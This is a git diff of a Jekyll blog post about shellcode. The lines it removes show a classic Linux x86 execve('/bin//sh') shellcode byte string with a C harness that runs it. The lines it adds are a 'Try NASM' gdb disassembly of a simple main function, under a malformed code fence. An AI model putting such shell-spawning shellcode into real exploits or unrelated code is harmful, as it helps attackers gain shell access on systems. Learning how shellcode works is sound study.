@@ -1,9 +1,11 @@
 ---
 layout: post
-title:  "Welcome to Jekyll!"
+title:  "NEW!"
 date:   2015-01-02 21:33:20
 categories: jekyll update
 ---
+
+Some Shellcode
 
 ```c
 char shellcode[] = 
@@ -30,27 +32,18 @@ int main() {
 
 ```
 
-{% highlight c %}
-char shellcode[] = 
+Try NASM
 
-"\x99"                         // cltd   
-"\x31\xc0"                     // xor    %eax,%eax
-"\x52"                         // push   %edx
-"\x68\x6e\x2f\x73\x68"         // push   $0x68732f6e
-"\x68\x2f\x2f\x62\x69"         // push   $0x69622f2f
-"\x89\xe3"                     // mov    %esp,%ebx
-"\x52"                         // push   %edx
-"\x53"                         // push   %ebx
-"\x89\xe1"                     // mov    %esp,%ecx
-"\xb0\x0b"                     // mov    $0xb,%al
-"\xcd\x80";                    // int    $0x80
-
-int main() {
-
-    void (*p)();
-    p = (void *)&shellcode;
-    printf("Lenght: %d\n", strlen(shellcode));
-    p();
-}
-{% endhighlight %}
-
+``nasm
+Dump of assembler code for function main:
+   0x080483c4 <+0>:	push   ebp
+   0x080483c5 <+1>:	mov    ebp,esp
+   0x080483c7 <+3>:	and    esp,0xfffffff0
+   0x080483ca <+6>:	sub    esp,0x10
+   0x080483cd <+9>:	mov    eax,0x80484a0
+   0x080483d2 <+14>:	mov    DWORD PTR [esp],eax
+   0x080483d5 <+17>:	call   0x80482fc <printf@plt>
+   0x080483da <+22>:	leave  
+   0x080483db <+23>:	ret    
+End of assembler dump.
+```
